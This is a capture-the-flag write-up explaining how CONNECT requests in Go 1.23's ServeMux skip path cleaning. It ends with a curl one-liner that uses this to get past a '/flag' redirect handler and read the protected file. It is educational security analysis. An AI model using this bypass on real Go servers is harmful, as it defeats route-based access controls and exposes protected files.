# Tomorin db 🐧
> Author: 堇姬Naup

## analyze
Its souce code is short.
It build one fileserver, and we can get under `/app/Tomorin` file.
```go
package main

import "net/http"

func main() {
	http.Handle("/", http.FileServer(http.Dir("/app/Tomorin")))
	http.HandleFunc("/flag", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "https://youtu.be/lQuWN0biOBU?si=SijTXQCn9V3j4Rl6", http.StatusFound)
  	})
  	http.ListenAndServe(":30000", nil)
}
```

And flag is in `/app/Tomorin`
But when we try to request to get flag, you will be redirected to youtube.
Because it have another handler which handle `/flag` request.

So we try to request `http://host/flag`
You don't get flag, and `/flag` handler will handle it.

When you try to request `http://host/./flag`, `http//host/../flag` or etc.
It still redirect you to youtube.
It sound so strange, so let me check source code.

## golang source code
You can read go 1.23.1 source code.

First read this

[src/net/http/server.go#L2573C1-L2579C2](https://github.com/golang/go/blob/release-branch.go1.23/src/net/http/server.go#L2573C1-L2579C2)

Your request will call `func Hnadler` and it next will call `findHnadler`

```go
func (mux *ServeMux) Handler(r *Request) (h Handler, pattern string) {
	if use121 {
		return mux.mux121.findHandler(r)
	}
	h, p, _, _ := mux.findHandler(r)
	return h, p
}
```

[src/net/http/server.go#L2585](https://github.com/golang/go/blob/release-branch.go1.23/src/net/http/server.go#L2585)

If we request not `CONNECT`, it will enter this part.
It will do `cleanPath(path)`
So if we try to request `http://host/./flag`, `./flag` path will be edit.
It change `./flag` to `/flag`. 

[cleanpath docs](https://pkg.go.dev/github.com/PuerkitoBio/httpmw/cleanpath)

```go
	} else {
		// All other requests have any port stripped and path cleaned
		// before passing to mux.handler.
		host = stripHostPort(r.Host)
		path = cleanPath(path)

		// If the given path is /tree and its handler is not registered,
		// redirect for /tree/.
```

But we can read request method `CONNECT`
```go
	if r.Method == "CONNECT" {
		// If r.URL.Path is /tree and its handler is not registered,
		// the /tree -> /tree/ redirect applies to CONNECT requests
		// but the path canonicalization does not.
		_, _, u := mux.matchOrRedirect(host, r.Method, path, r.URL)
		if u != nil {
			return RedirectHandler(u.String(), StatusMovedPermanently), u.Path, nil, nil
		}
		// Redo the match, this time with r.Host instead of r.URL.Host.
		// Pass a nil URL to skip the trailing-slash redirect logic.
		n, matches, _ = mux.matchOrRedirect(r.Host, r.Method, path, nil)
```
It doesn't call cleanpath cleaning your url path.
And directly call next function.

So we try to do this :

`curl --path-as-is -X CONNECT http://host/./flag`

you will get flag!

PS: If you use curl, curl still normalize the URL path. we can add `--path-as-is` prevent it do normalize.

## script 
```sh
curl --path-as-is -X CONNECT http://host/./flag
```
